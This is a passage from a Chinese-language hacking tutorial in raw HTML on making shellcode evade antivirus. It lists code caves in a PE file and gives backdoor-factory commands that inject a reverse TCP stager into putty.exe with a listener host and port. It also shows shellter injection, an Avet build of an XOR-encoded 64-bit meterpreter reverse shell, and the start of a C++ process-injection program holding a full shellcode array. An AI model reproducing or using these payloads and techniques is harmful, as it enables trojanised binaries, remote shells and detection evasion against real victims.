&quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">12.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc86fd0</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc87568</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1432</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">13.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc8760a</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc87a32</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1064</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">14.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc886af</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc88d58</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1705</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">15.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc8b8b3</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc8bdd8</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">1317</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">16.</span> <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Name</span>: .rsrc; <span style="color: rgb(0, 134, 179);">Section</span> <span style="color: rgb(0, 134, 179);">Begin</span>: <span style="color: rgb(0, 134, 179);">0x66a200</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xd33200</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(167, 29, 93);">begin</span>: <span style="color: rgb(0, 134, 179);">0xc8eaba</span> <span style="color: rgb(0, 134, 179);">End</span>: <span style="color: rgb(0, 134, 179);">0xc8ed65</span>; <span style="color: rgb(0, 134, 179);">Cave</span> <span style="color: rgb(0, 134, 179);">Size</span>: <span style="color: rgb(0, 134, 179);">683</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">BDF中-F参数实现多裂缝注入。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">backdoor-factory -f putty.exe -s show</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">15.135</span> -P <span style="color: rgb(0, 134, 179);">4444</span></span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">shellter:</h4><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">A 选项增加区段注入</p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="143" data-backw="319" data-ratio="0.44817658349328215" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/1_J7F5RzNHwiaor7iaWgiaicOfwqsLfQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkEQiaxOUjibmJ5B0JnYvFDcVxESgLzAJ7F5RzNHwiaor7iaWgiaicOfwqsLfQ/640?wx_fmt=png'" data-type="png" data-w="1042" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">Avet：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">root@kali:<span style="color: rgb(24, 54, 145);">/tmp/</span>avet/build<span style="color: rgb(150, 152, 150);"># leafpad build_win64_meterpreter_rev_tcp_xor_fopen.sh </span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">lhost=<span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">174.134</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">root@kali:<span style="color: rgb(24, 54, 145);">/tmp/</span>avet/build<span style="color: rgb(150, 152, 150);"># cd ..</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">root@kali:<span style="color: rgb(24, 54, 145);">/tmp/</span>avet<span style="color: rgb(150, 152, 150);"># ./build/build_win64_meterpreter_rev_tcp_xor_fopen.sh</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">No</span> <span style="color: rgb(0, 134, 179);">Arch</span> selected, selecting <span style="color: rgb(0, 134, 179);">Arch</span>: x64 <span style="color: rgb(167, 29, 93);">from</span> the payload</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Found</span> <span style="color: rgb(0, 134, 179);">1</span> compatible encoders</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Attempting</span> to encode payload <span style="color: rgb(167, 29, 93);">with</span> <span style="color: rgb(0, 134, 179);">1</span> iterations of x64/xor</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">x64/xor succeeded <span style="color: rgb(167, 29, 93);">with</span> size <span style="color: rgb(0, 134, 179);">551</span> (iteration=<span style="color: rgb(0, 134, 179);">0</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">x64/xor chosen <span style="color: rgb(167, 29, 93);">with</span> <span style="color: rgb(167, 29, 93);">final</span> size <span style="color: rgb(0, 134, 179);">551</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Payload</span> size: <span style="color: rgb(0, 134, 179);">551</span> bytes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Final</span> size of c file: <span style="color: rgb(0, 134, 179);">2339</span> bytes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">.<span style="color: rgb(24, 54, 145);">/build/</span>build_win64_meterpreter_rev_tcp_xor_fopen.sh: line <span style="color: rgb(0, 134, 179);">6</span>: ./make_avet: cannot execute binary file: <span style="color: rgb(0, 134, 179);">Exec</span> format error</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">avet.c: <span style="color: rgb(0, 134, 179);">In</span> <span style="color: rgb(167, 29, 93);">function</span> <span style="color: rgb(24, 54, 145);">'main'</span>:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">avet.c:<span style="color: rgb(0, 134, 179);">122</span>:<span style="color: rgb(0, 134, 179);">15</span>: error: <span style="color: rgb(24, 54, 145);">'buf'</span> undeclared (first <span style="color: rgb(167, 29, 93);">use</span> <span style="color: rgb(167, 29, 93);">in</span> <span style="color: rgb(167, 29, 93);">this</span> <span style="color: rgb(167, 29, 93);">function</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   shellcode = buf;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               ^</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">avet.c:<span style="color: rgb(0, 134, 179);">122</span>:<span style="color: rgb(0, 134, 179);">15</span>: note: each undeclared identifier <span style="color: rgb(167, 29, 93);">is</span> reported only once <span style="color: rgb(167, 29, 93);">for</span> each <span style="color: rgb(167, 29, 93);">function</span> it appears <span style="color: rgb(167, 29, 93);">in</span></span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">除了也可以手动整个进程注入,起一个正常进程注入shellcode</h4><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">例子:</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">"stdafx.h"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">&lt;Windows.h&gt;</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span><span style="color: rgb(24, 54, 145);">&lt;stdio.h&gt;</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span> <span style="color: rgb(24, 54, 145);">"iostream"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(167, 29, 93);">namespace</span> std;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">unsigned</span> <span style="color: rgb(167, 29, 93);">char</span> shellcode[] =</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xb8\x72\xd9\xb8\x52\xda\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x56\x83\xc2\x04\x31\x42\x0f\x03\x42\x7d\x3b\x4d\xae\x69\x39"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xae\x4f\x69\x5e\x26\xaa\x58\x5e\x5c\xbe\xca\x6e\x16\x92\xe6"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x05\x7a\x07\x7d\x6b\x53\x28\x36\xc6\x85\x07\xc7\x7b\xf5\x06"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x4b\x86\x2a\xe9\x72\x49\x3f\xe8\xb3\xb4\xb2\xb8\x6c\xb2\x61"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x2d\x19\x8e\xb9\xc6\x51\x1e\xba\x3b\x21\x21\xeb\xed\x3a\x78"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x2b\x0f\xef\xf0\x62\x17\xec\x3d\x3c\xac\xc6\xca\xbf\x64\x17"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x32\x13\x49\x98\xc1\x6d\x8d\x1e\x3a\x18\xe7\x5d\xc7\x1b\x3c"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x1c\x13\xa9\xa7\x86\xd0\x09\x0c\x37\x34\xcf\xc7\x3b\xf1\x9b"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x80\x5f\x04\x4f\xbb\x5b\x8d\x6e\x6c\xea\xd5\x54\xa8\xb7\x8e"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xf5\xe9\x1d\x60\x09\xe9\xfe\xdd\xaf\x61\x12\x09\xc2\x2b\x7a"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xfe\xef\xd3\x7a\x68\x67\xa7\x48\x37\xd3\x2f\xe0\xb0\xfd\xa8"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x71\xd6\xfd\x67\x39\xb7\x03\x88\x39\x91\xc7\xdc\x69\x89\xee"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x5c\xe2\x49\x0e\x89\x9e\x43\x98\xf2\xf6\xfa\xdc\x9b\x04\x03"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xcc\x07\x81\xe5\xbe\xe7\xc1\xb9\x7e\x58\xa1\x69\x17\xb2\x2e"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x55\x07\xbd\xe5\xfe\xa2\x52\x53\x56\x5b\xca\xfe\x2c\xfa\x13"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xd5\x48\x3c\x9f\xdf\xad\xf3\x68\xaa\xbd\xe4\x0e\x54\x3e\xf5"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xba\x54\x54\xf1\x6c\x03\xc0\xfb\x49\x63\x4f\x03\xbc\xf0\x88"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xfb\x41\xc0\xe3\xca\xd7\x6c\x9c\x32\x38\x6c\x5c\x65\x52\x6c"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x34\xd1\x06\x3f\x21\x1e\x93\x2c\xfa\x8b\x1c\x04\xae\x1c\x75"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xaa\x89\x6b\xda\x55\xfc\xef\x1d\xa9\x82\xc7\x85\xc1\x7c\x58"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x36\x11\x17\x58\x66\x79\xec\x77\x89\x49\x0d\x52\xc2\xc1\x84"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x33\xa0\x70\x98\x19\x64\x2c\x99\xae\xbd\xdf\xe0\xdf\x42\x20"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\x15\xf6\x26\x21\x15\xf6\x58\x1e\xc3\xcf\x2e\x61\xd7\x6b\x20"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(24, 54, 145);">"\xd4\x7a\xdd\xab\x16\x28\x1d\xfe"</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    BOOL injection()</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">wchar_t</span> <span style="color: rgb(0, 134, 179);">Cappname</span>[MAX_PATH] = { <span style="color: rgb(0, 134, 179);">0</span> };</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        STARTUPINFO si;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial 